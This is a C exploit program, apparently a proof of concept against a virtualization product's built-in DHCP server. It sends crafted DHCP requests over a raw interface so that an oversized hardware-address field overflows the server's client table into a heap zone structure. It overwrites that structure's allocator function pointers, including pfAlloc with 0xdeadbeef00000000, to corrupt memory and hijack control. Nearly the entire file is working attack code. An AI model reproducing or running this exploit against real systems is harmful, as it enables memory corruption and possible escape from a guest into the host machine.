/* 
 * DHCP code based on project by Samuel Jacob (samueldotj@gmail.com)
 * https://github.com/samueldotj/dhcp-client
 */

#include <err.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "dhcp-client.h"
#include "address.h"
#include "critsect.h"

#define NB_ADDR		16

pcap_t *pcap_handle;
char *dev;

int
get_ip_address(char *dev_name, uint32_t *ip)
{
	struct ifreq s;
	int fd, result;

	memset((void *)&s, 0, sizeof(struct ifreq));
	strcpy(s.ifr_name, dev_name);

	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	result = ioctl(fd, SIOCGIFADDR, &s);
	close(fd);
	if (result != 0)
		return -1;

	*ip = ((struct sockaddr_in *)&s.ifr_addr)->sin_addr.s_addr;

	return 0;
}

int
fill_dhcp_request_options(dhcp_t *dhcp, uint32_t ip)
{
	int len = 0;
	u_int32_t req_ip = htonl(ip);
	u_int8_t option;

	option = DHCP_OPTION_REQUEST;
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_DHCP, &option, sizeof(option));
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_REQ_IP, (u_int8_t *)&req_ip, sizeof(req_ip));
	option = 0;
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_END, &option, sizeof(option));
	return len;
}

#define DUMMY	0x4242424242424242
#define ADD_DATA(addr, gadget) (*addr = gadget); addr++

void
dhcp_output(dhcp_t *dhcp, u_int8_t *mac, int *len, uint8_t bootp_clients)
{
	uint64_t *data;
	RTCRITSECT *critsect;

	*len += sizeof(dhcp_t);
	memset(dhcp, 0, sizeof(dhcp_t));

	dhcp->opcode = DHCP_BOOTREQUEST;
	dhcp->htype = DHCP_HARDWARE_TYPE_10_EHTHERNET;
	dhcp->hlen = 6;	

	/* overflow the last client structure */
	if (bootp_clients == NB_ADDR - 1) {

		warnx("[+] Overflowing bootp_clients into uma_zone structure...");
		sleep(2);

		/* start payload after aligning with padding */
		data = (uint64_t *)((uint8_t *)dhcp->chaddr + 7);

		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);

		/* Corrupts struct uma_zone beyond this */
		ADD_DATA(data, 0x4343434343434343);
		ADD_DATA(data, DUMMY);

		/* RTCRITSECT */
		critsect = (RTCRITSECT *)data;
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		critsect->fFlags = RTCRITSECT_FLAGS_NOP;	// skip processing RTCRITSECT

		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, 0);				// pfCtor
		ADD_DATA(data, 0);				// pfDtor
		ADD_DATA(data, 0);				// pfInit
		ADD_DATA(data, 0);				// pfFini
		ADD_DATA(data, 0xdeadbeef00000000);		// pfAlloc

		/* This pointer can't be overwritten with NULL, so just return */
		ADD_DATA(data, ret);				// pfFree

		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);				
		data++;						// overwrites magic cookie and options, hence skip
		data++;
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);
		ADD_DATA(data, DUMMY);

		dhcp->hlen = (uint64_t)data - (uint64_t)dhcp->chaddr;

	} else {

		memset(dhcp->chaddr, bootp_clients, DHCP_CHADDR_LEN); 

	}

	dhcp->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
}

int
dhcp_request(u_int8_t *mac)
{
	int len, rv;
	u_char packet[4096];
	struct in_addr ip_addr;
	struct udphdr *udp_header;
	struct ip *ip_header;
	dhcp_t *dhcp;
	uint32_t ip;

	ip_header = (struct ip *)(packet + sizeof(struct ether_header));
	udp_header = (struct udphdr *)(((char *)ip_header) + sizeof(struct ip));
	dhcp = (dhcp_t *)(((char *)udp_header) + sizeof(struct udphdr));

	rv = get_ip_address(dev, &ip);
	if (rv != 0)
		errx(EXIT_FAILURE, "[!] Unable to get IP address for %s", dev);

	ip_addr.s_addr = ip;
	warnx("[+] Current IP address : %s", inet_ntoa(ip_addr));

	/* skip the already assigned IP address */
	for (uint8_t bootp_clients = 1; bootp_clients < NB_ADDR; bootp_clients++) {

		ip_addr.s_addr = ntohl(htonl(ip) + bootp_clients);
		warnx("[+] Requesting IP address : %s", inet_ntoa(ip_addr));

		len = fill_dhcp_request_options(dhcp, htonl(ip) + bootp_clients);
		dhcp_output(dhcp, mac, &len, bootp_clients);
		udp_output(udp_header, &len);
		ip_output(ip_header, &len);
		ether_output(packet, mac, len);
	}

	return 0;
}


int main(int argc, char **argv)
{
	int rv;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_int8_t mac[6];

	if (argc < 2)
		errx(EXIT_FAILURE, "[!] Usage: %s <interface>", argv[0]);
	dev = argv[1];

	rv = get_mac_address(dev, mac);
	if (rv != 0)
		errx(EXIT_FAILURE, "[!] Unable to get MAC address for %s", dev);

	pcap_handle = pcap_open_live(dev, BUFSIZ, 0, 10, errbuf);
	if (pcap_handle == NULL)
		errx(EXIT_FAILURE, "[!] Couldn't open device %s", errbuf);

	warnx("[+] Using interface %s...", dev);

	warnx("[+] Sending DHCP requests...");
	dhcp_request(mac);

	pcap_close(pcap_handle);

	return 0;
}

